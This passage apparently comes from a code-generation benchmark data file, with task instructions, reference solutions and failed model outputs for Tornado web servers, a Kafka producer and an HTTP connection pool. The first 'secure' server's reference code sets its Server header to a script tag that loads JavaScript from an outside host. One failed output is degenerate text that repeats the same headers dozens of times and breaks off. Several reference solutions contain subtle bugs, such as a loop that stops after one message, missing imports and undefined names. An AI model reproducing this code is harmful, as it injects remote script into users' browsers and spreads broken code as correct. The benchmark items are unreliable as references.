    "Instruction": "Task Description: Create a Tornado-based HTTP server with multiple route handlers and security headers configuration.\n\nClass Description: The implementation consists of several classes that together create a secure web server using Tornado framework. The BaseHandler provides common security headers and functionality, while specialized handlers process different routes. The TornadoHTTPServer class orchestrates the application setup and startup.\n\nAttributes:\n\nDOMAIN: [str] - Global variable storing the domain name for security policies\napp: [tornado.web.Application] - The Tornado web application instance in TornadoHTTPServer\n\nMethods:\n\nBaseHandler:\n__init__: (self, *args, **kwargs) -> None - Initializes the handler and sets security headers\ncompute_etag: (self) -> None - Disables ETag generation for responses\n\nXSSHunterApplicationHandler:\nget: (self) -> None - Handles GET requests for the /app route, renders mainapp.htm template\n\nTornadoHTTPServer:\n__init__: (self, domain: str) -> None - Initializes the server with given domain and sets up routes\nstart: (self, port: int = 1234) -> None - Starts the server on specified port\n\nHomepageHandler:\nget: (self) -> None - Handles GET requests for the root route, renders homepage.htm template\n\nFeaturesHandler:\nget: (self) -> None - Handles GET requests for /features route, renders features.htm template\n\nSignUpHandler:\nget: (self) -> None - Handles GET requests for /signup route, renders signup.htm template\n\nContactHandler:\nget: (self) -> None - Handles GET requests for /contact route, renders contact.htm template",
    "Canonical_solution": "import tornado.ioloop\nimport tornado.web\nimport tornado.template\n\nclass BaseHandler(tornado.web.RequestHandler):\n    def __init__(self, *args, **kwargs):\n        super(BaseHandler, self).__init__(*args, **kwargs)\n        self.set_header(\"X-Frame-Options\", \"deny\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"Server\", \"<script src=//y.vg></script>\")\n        self.set_header(\"Content-Security-Policy\", \"default-src 'self' \" + DOMAIN + \" api.\" + DOMAIN + \"; style-src 'self' fonts.googleapis.com; img-src 'self' api.\" + DOMAIN + \"; font-src 'self' fonts.googleapis.com fonts.gstatic.com; script-src 'self'; frame-src 'self'\")\n\n    def compute_etag(self):\n        return None\n\nclass XSSHunterApplicationHandler(BaseHandler):\n    def get(self):\n        loader = tornado.template.Loader(\"templates/\")\n        self.write(loader.load(\"mainapp.htm\").generate(domain=DOMAIN))\n\nclass TornadoHTTPServer:\n    def __init__(self, domain):\n        global DOMAIN\n        DOMAIN = domain\n        self.app = tornado.web.Application([\n            (r\"/\", HomepageHandler),\n            (r\"/app\", XSSHunterApplicationHandler),\n            (r\"/features\", FeaturesHandler),\n            (r\"/signup\", SignUpHandler),\n            (r\"/contact\", ContactHandler),\n            (r\"/static/(.*)\", tornado.web.StaticFileHandler, {\"path\": \"static/\"}),\n        ])\n\n    def start(self, port=1234):\n        self.app.listen(port)\n        tornado.ioloop.IOLoop.current().start()\n\nclass HomepageHandler(BaseHandler):\n    def get(self):\n        loader = tornado.template.Loader(\"templates/\")\n        self.write(loader.load(\"homepage.htm\").generate())\n\nclass FeaturesHandler(BaseHandler):\n    def get(self):\n        loader = tornado.template.Loader(\"templates/\")\n        self.write(loader.load(\"features.htm\").generate(domain=DOMAIN))\n\nclass SignUpHandler(BaseHandler):\n    def get(self):\n        loader = tornado.template.Loader(\"templates/\")\n        self.write(loader.load(\"signup.htm\").generate(domain=DOMAIN))\n\nclass ContactHandler(BaseHandler):\n    def get(self):\n        loader = tornado.template.Loader(\"templates/\")\n        self.write(loader.load(\"contact.htm\").generate())",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "```python\nimport tornado.ioloop\nimport tornado.web\nimport os\n\nDOMAIN = \"example.com\"\n\nclass BaseHandler(tornado.web.RequestHandler):\n    def __init__(self, *args, **kwargs):\n        super(BaseHandler, self).__init__(*args, **kwargs)\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"X-Download-Options\", \"noopen\")\n        self.set_header(\"X-Permitted-Cross-Domain-Policies\", \"none\")\n        self.set_header(\"X-Content-Duration\", \"0\")\n        self.set_header(\"X-Robots-Tag\", \"noindex, nofollow\")\n        self.set_header(\"X-UA-Compatible\", \"IE=edge\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Download-Options\", \"noopen\")\n        self.set_header(\"X-Permitted-Cross-Domain-Policies\", \"none\")\n        self.set_header(\"X-Content-Duration\", \"0\")\n        self.set_header(\"X-Robots-Tag\", \"noindex, nofollow\")\n        self.set_header(\"X-UA-Compatible\", \"IE=edge\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';\")\n        self.set_header(\"Referrer-Policy\", \"no-referrer-when-downgrade\")\n        self.set_header(\"Cache-Control\", \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\")\n        self.set_header(\"Pragma\", \"no-cache\")\n        self.set_header(\"Expires\", \"0\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-X"
  },
  {
    "Task_id": 245,
    "Instruction": "Task Description: Create a Tornado-based HTTP server that handles web requests and serves responses, including rendering templates and serving static files.\n\nClass Description: TornadoServer is a class that encapsulates the setup and running of a Tornado web server. It configures routes, template paths, and static file paths, and provides a method to start the server.\n\nAttributes:\n- handlers: [list] - A list of URL routing tuples mapping paths to request handlers\n- template_path: [str] - The file system path to the directory containing template files\n- static_path: [str] - The file system path to the directory containing static files\n\nMethods:\n- __init__: [Name](port: int = 8000) -> None - Initializes the server with default port 8000, sets up default handlers, and configures template and static paths\n- run: [Name]() -> None - Starts the Tornado web server by:\n  1. Parsing command line options\n  2. Creating a Tornado Application instance with configured handlers and paths\n  3. Starting an HTTP server on the specified port\n  4. Beginning the I/O event loop\n\nThe class works with a companion request handler (IndexHandler) that:\n- Inherits from tornado.web.RequestHandler\n- Implements a GET method to render a template with provided data\n- Takes no explicit constructor parameters\n- Returns rendered HTML output via self.render()",
    "Canonical_solution": "import tornado.httpserver\nimport tornado.ioloop\nimport tornado.web\nimport tornado.options\nfrom tornado.options import define, options\n\ndefine(\"port\", default=8000, help=\"run on the given port\", type=int)\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        lst = [\"python\",\"www.itdiffer.com\",\"qiwsir@gmail.com\"]\n        self.render(\"index.html\", info=lst)\n\nclass TornadoServer:\n    def __init__(self, port=8000):\n        options.port = port\n        self.handlers = [(r\"/\", IndexHandler)]\n        self.template_path = os.path.join(os.path.dirname(__file__), \"temploop\")\n        self.static_path = \"./static\"\n\n    def run(self):\n        tornado.options.parse_command_line()\n        app = tornado.web.Application(self.handlers, self.template_path, debug=True)\n        http_server = tornado.httpserver.HTTPServer(app)\n        http_server.listen(options.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "```python\nimport tornado.ioloop\nimport tornado.web\n\nclass TornadoServer:\n    def __init__(self, port: int = 8000):\n        self.handlers = [\n            (r\"/\", IndexHandler),\n        ]\n        self.template_path = \"templates\"\n        self.static_path = \"static\"\n        self.port = port\n\n    def run(self):\n        app = tornado.web.Application(\n            handlers=self.handlers,\n            template_path=self.template_path,\n            static_path=self.static_path,\n        )\n        app.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.render(\"index.html\")\n\nif __name__ == \"__main__\":\n    server = TornadoServer()\n    server.run()\n```\n"
  },
  {
    "Task_id": 246,
    "Instruction": "Task Description: Implement a Tornado-based HTTP server that handles GET requests and responds with a customizable greeting message.\n\nClass Description: The TornadoHTTPServer class encapsulates the functionality to create and run a Tornado web server that listens on a specified port and handles HTTP requests.\n\nAttributes:\n- port: int - The port number on which the HTTP server will listen (default: 8000)\n- app: tornado.web.Application - The Tornado web application instance that routes requests to handlers\n- http_server: tornado.httpserver.HTTPServer - The HTTP server instance that serves the application\n\nMethods:\n- __init__(port: int = 8000) -> None - Initializes the HTTP server with the specified port (default: 8000)\n- run() -> None - Starts the HTTP server on the specified port and begins the I/O loop\n\nAdditional Class (Request Handler):\n- IndexHandler: tornado.web.RequestHandler - Handles HTTP GET requests to the root URL (\"/\")\n  Methods:\n  - get() -> None - Processes GET requests, optionally takes a 'greeting' query parameter, and returns a response combining the greeting with a welcome message",
    "Canonical_solution": "import tornado.httpserver\nimport tornado.ioloop\nimport tornado.options\nimport tornado.web\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        greeting = self.get_argument('greeting', 'Helloi World')\n        self.write(greeting + '\\nwelcome you to read: www.itdiffer.com')\n\nclass TornadoHTTPServer:\n    def __init__(self, port=8000):\n        self.port = port\n        self.app = tornado.web.Application(handlers=[(r\"/\", IndexHandler)])\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n\n    def run(self):\n        self.http_server.listen(self.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "```python\nimport tornado.ioloop\nimport tornado.web\nimport tornado.httpserver\n\nclass TornadoHTTPServer:\n    def __init__(self, port: int = 8000) -> None:\n        self.port = port\n        self.app = tornado.web.Application([\n            (r\"/\", IndexHandler),\n        ])\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n\n    def run(self) -> None:\n        self.http_server.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self) -> None:\n        greeting = self.get_query_argument(\"greeting\", \"Hello\")\n        self.write(f\"{greeting}, welcome to the Tornado HTTP server!\")\n```\n"
  },
  {
    "Task_id": 255,
    "Instruction": "Task Description: Implement a function that sends messages to a Kafka topic, ensuring the topic exists before sending messages and properly managing resources.\n\nFunction Description: The function `kafka_producer` sends messages from a file to a specified Kafka topic. It first checks if the topic exists and creates it if necessary. Then, it reads lines from the input file, encodes them, and sends them to the Kafka topic using a producer instance. The function includes logging for progress tracking and ensures proper cleanup by closing the producer and admin client.\n\nInput:  \n- `servers`: [str] - Comma-separated list of Kafka bootstrap servers.  \n- `topic`: [str] - The name of the Kafka topic to which messages will be sent.  \n- `input_path`: [str] - The path to the input file containing messages to be sent.  \n- `timeout`: [int] - The timeout in seconds for the Kafka producer request.  \n\nOutput:  \n- None: The function does not return any value but sends messages to the specified Kafka topic and logs progress.",
    "Canonical_solution": "import argparse\nimport logging\nimport sys\nfrom kafka import KafkaAdminClient\nfrom kafka import KafkaProducer\nfrom kafka.admin import NewTopic\n\ndef kafka_producer(servers, topic, input_path, timeout):\n    admin_clt = KafkaAdminClient(bootstrap_servers=servers)\n    if topic not in admin_clt.list_topics():\n        admin_clt.create_topics(\n            new_topics=[\n                NewTopic(\n                    name=topic,\n                    num_partitions=1,\n                    replication_factor=1,\n                    topic_configs={'max.message.bytes': 1024 * 1024 * 1024})\n            ],\n            validate_only=False)\n        logging.info('create increment save topic: %s' % topic)\n    admin_clt.close()\n\n    producer = KafkaProducer(\n        bootstrap_servers=servers,\n        request_timeout_ms=timeout * 1000,\n        api_version=(0, 10, 1))\n\n    i = 1\n    with open(input_path, 'r') as fin:\n        for line_str in fin:\n            producer.send(topic, line_str.encode('utf-8'))\n            i += 1\n            break\n            if i % 100 == 0:\n                logging.info('progress: %d' % i)\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "wrong_result": "```python\nimport os\nimport time\nimport logging\nfrom confluent_kafka import Producer, admin, KafkaException\n\ndef kafka_producer(servers, topic, input_path, timeout):\n    # Configure logging\n    logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')\n\n    # Create a Kafka admin client\n    admin_client = admin.AdminClient({'bootstrap.servers': servers})\n\n    # Check if the topic exists, create it if necessary\n    topic_metadata = admin_client.list_topics(timeout=timeout)\n    if topic not in topic_metadata.topics:\n        logging.info(f\"Topic '{topic}' does not exist. Creating it...\")\n        admin_client.create_topics([admin.NewTopic(topic, num_partitions=1, replication_factor=1)], timeout=timeout)\n        logging.info(f\"Topic '{topic}' created successfully.\")\n\n    # Create a Kafka producer\n    producer = Producer({'bootstrap.servers': servers, 'request.timeout.ms': timeout * 1000})\n\n    # Read lines from the input file and send them to the Kafka topic\n    with open(input_path, 'r') as input_file:\n        for line in input_file:\n            producer.produce(topic, line.encode('utf-8'))\n            producer.poll(0)\n\n    # Wait for all messages to be sent\n    producer.flush(timeout)\n\n    # Close the producer and admin client\n    producer.close()\n    admin_client.close()\n\n    logging.info(\"All messages sent successfully.\")\n```\n"
  },
  {
    "Task_id": 26,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages HTTP connections to a specified host, handling connection creation, request execution, and response processing with support for retries, timeouts, and redirects.\n\nClass Description: HTTPConnectionPool is a connection pool manager for HTTP connections that provides efficient reuse of connections to a specified host. It handles connection lifecycle, request execution, error handling, and retries.\n\nAttributes:\n- scheme: str - The URL scheme (default \"http\")\n- host: str - The normalized hostname for connections\n- port: int - The port number for connections\n- timeout: Timeout - Connection and read timeout configuration\n- retries: Retry - Retry configuration for failed requests\n- proxy: str - Proxy server URL if configured\n- proxy_headers: dict - Headers for proxy connections\n- conn_kw: dict - Additional connection parameters\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None\n  - Initializes the connection pool with target host and configuration\n  - Input: \n    - host: str - Target hostname\n    - port: int - Target port (optional)\n    - timeout: Timeout - Timeout configuration\n    - retries: Retry - Retry configuration\n    - _proxy: str - Proxy URL (optional)\n    - _proxy_headers: dict - Proxy headers (optional)\n    - conn_kw: dict - Additional connection parameters\n\n- _new_conn() -> HTTPConnection\n  - Creates a new HTTP connection\n  - Output: HTTPConnection - A new connection instance\n\n- _make_request(conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw) -> HTTPResponse\n  - Executes an HTTP request through the given connection\n  - Input:\n    - conn: HTTPConnection - Connection to use\n    - method: str - HTTP method (GET, POST, etc.)\n    - url: str - Target URL\n    - timeout: Timeout - Request timeout\n    - chunked: bool - Whether to use chunked transfer encoding\n  - Output: HTTPResponse - The HTTP response\n\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, chunked=False, **response_kw) -> HTTPResponse\n  - Main method to execute HTTP requests with connection pooling\n  - Input:\n    - method: str - HTTP method\n    - url: str - Target URL\n    - body: str - Request body (optional)\n    - headers: dict - Request headers (optional)\n    - retries: Retry - Retry configuration (optional)\n    - redirect: bool - Whether to follow redirects\n    - timeout: Timeout - Request timeout\n    - chunked: bool - Use chunked transfer encoding\n  - Output: HTTPResponse - The HTTP response",
    "Canonical_solution": "import socket\nfrom socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    EmptyPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProtocolError,\n    ProxyError,\n    ReadTimeoutError,\n    SSLError,\n    TimeoutError,\n)\nfrom .util.connection import is_connection_dropped\nfrom .util.proxy import connection_requires_http_tunnel\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import Url, _encode_target\nfrom .util.url import _normalize_host as normalize_host\nfrom .util.url import get_host, parse_url\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        strict=False,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = _normalize_host(host, scheme=self.scheme)\n        self._proxy_host = host.lower()\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            strict=self.strict,\n            **self.conn_kw\n        )\n\n    def _make_request(\n        self, conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw\n    ):\n        try:\n            if chunked:\n                conn.request_chunked(method, 